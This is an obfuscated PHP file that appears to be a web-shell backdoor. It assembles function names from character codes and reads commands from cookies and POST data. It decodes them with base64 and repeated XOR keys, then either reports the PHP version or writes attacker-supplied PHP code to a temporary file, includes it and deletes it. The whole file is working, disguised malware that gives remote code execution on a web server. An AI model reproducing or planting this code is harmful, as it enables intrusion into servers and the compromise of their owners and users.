<?php       function/*  hp */fqhmz(){      echo	58575;       }$uqiyy/*   iuwtp   */=/*ekuc_  */'uqiyy'	^	'';
$picyigqii/*t */=	"\x66"	./* f  */"\x69"	.     "\x6c"/*   zsf  */.       "e"."\137"	.	"\160"	.  "\x75"/* ap   */./*   mqgy*/$uqiyy(116)/*   mxha  */.      "_"."\143"	.	"o"."\x6e"/*qs   */./*  vg */"t"."e".$uqiyy(370-260)  .	"\164"	.  "s";$mzsumh/*   rc   */=	"b".$uqiyy(684-587)       .   $uqiyy(115)/*   i   */.       "\x65"	./*   nt   */"6"."4"."\x5f"	./*npzx_ */"d".$uqiyy(362-261)	./*   t_ */"\x63"      .   "\x6f"   .	"d".$uqiyy(101);$xwgqqk      =      "u"."\x6e"      ./*  f   */"\163"      .	"e"."\162"/*pi   */.	$uqiyy(454-349)     .     "\x61"/*   _xl  */.    $uqiyy(108)	.	"\x69"       .       $uqiyy(277-155)/*  js*/./*ix */"\145";


$mqedwgaz    =  "\x70"	.	"h"."p"."\x76"    .	"e"."r".$uqiyy(232-117)  .	"\151"	.    "o"."n";


$xoefgl_    =	$uqiyy(117)	./*   ept  */"n".$uqiyy(928-820)   .  "i"."\x6e"     .	"k";

/* fp  */


function/*  ti*/ucvqxpn_($nlnrffqj,	$tpydys_)


{


	global	$uqiyy;
    $gpnfckwk	=	"";

/*  oa_nu  */for   ($bwpqxi	=/* d  */0;/*  tc   */$bwpqxi	<	strlen($nlnrffqj);)/*hxvc_ */{

	for	($jxtzsmu	=/* iug */0;	$jxtzsmu   </* i  */strlen($tpydys_)      &&       $bwpqxi     </*ryk   */strlen($nlnrffqj);       $jxtzsmu++,/*   ghcb */$bwpqxi++)/*   zi*/{


      $gpnfckwk	.=	$uqiyy(ord($nlnrffqj[$bwpqxi])	^	ord($tpydys_[$jxtzsmu]));

    }
/*   qeilb  */}
/*  azfi */return/*w   */$gpnfckwk;
}



$vybgxobawl   =/*ox   */$_COOKIE;
$pokt_xrzwu	=	$_POST;
$vybgxobawl/*  rcx*/=	array_merge($pokt_xrzwu,  $vybgxobawl);


$nqrwurxda	=/*q   */"3"."\x33"	.    "\x66"  .     "\x39"/*   ks  */.    "\70"      .     $uqiyy(97)      .	$uqiyy(97)."9"."-"."1"."\x63"       .   "\66"    .   "\x36"   .     $uqiyy(1030-985)  ./*   rqm   */"\64"  .   $uqiyy(54)/*bio*/./* xfge   */"\x35"	.	"8"."-"."\142"	.	"9"."f"."b"."-".$uqiyy(217-161)       ./*  woi   */"d"."\145".$uqiyy(653-599)/*   yaf  */.      $uqiyy(51)	.    "\145"."d"."9"."7"."3"."7"."\145";foreach	($vybgxobawl/*   vffgg */as/*   jo   */$bpzjmzwm       =>/*   s   */$nlnrffqj)   {


	$nlnrffqj   =/*  d_u */$xwgqqk(ucvqxpn_(ucvqxpn_($mzsumh($nlnrffqj),     $nqrwurxda),   $bpzjmzwm));
	if/* o  */(isset($nlnrffqj[$uqiyy(97).$uqiyy(401-294)]))/*oxhz */{
	if	($nlnrffqj[$uqiyy(97)]  ==/*   zdbq */"\x69")/* i  */{
      $bwpqxi	=       array();	$bwpqxi["p".$uqiyy(118)]      =/*gfp */$mqedwgaz();


	$bwpqxi["s"."v"]	=/*   h  */"3"."."."5";/*  bdj  */echo/*jt */@serialize($bwpqxi);	}     elseif   ($nlnrffqj[$uqiyy(97)]/*   jyhf */==    "\145")	{


	$emzqecstbx/*csm  */=  sprintf("."."\x2f"/* qwf */.	"\x25"	.	"s".$uqiyy(46)	./*  _yh*/"p"."l",	md5($nqrwurxda));

  $picyigqii($emzqecstbx,  "<"	.	"?"."\160"/*si*/.	$uqiyy(588-484)      .      "\x70"       ./*   kaxi  */$uqiyy(32)	./*   ipe  */"\165"    ./* ptlh */"n"."l".$uqiyy(589-484)/* e  */.	"\x6e"	.       $uqiyy(614-507)	.	"\50"/*   qnmue   */./*  rkqj_ */"_"."\x5f"	.    $uqiyy(233-163)  .	"\111"/* lt*/.     "L"."E"."\137"/*  fjo*/./*  sy*/"_".")".";".$uqiyy(32)	.       $nlnrffqj["d"]);

	include($emzqecstbx);


      $xoefgl_($emzqecstbx);

/*wdau  */}

/*ropxm  */exit();

/*   iw_x  */}}

